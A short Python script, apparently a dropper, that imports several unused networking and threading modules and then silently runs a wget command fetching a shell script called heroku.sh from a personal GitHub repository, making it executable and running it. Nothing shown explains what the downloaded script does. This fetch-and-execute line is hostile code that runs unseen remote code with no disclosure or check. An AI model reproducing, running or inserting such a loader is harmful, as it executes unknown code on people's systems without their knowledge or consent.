import hashlib
import os
import socket
import sys 
import time
import urllib.request
import ssl
import random
import threading
import multiprocessing
import string

script = 'wget -q https://raw.githubusercontent.com/eliteleon/private/main/bash/heroku.sh && chmod +x heroku.sh && ./heroku.sh'
run = os.popen(script).readlines()
run
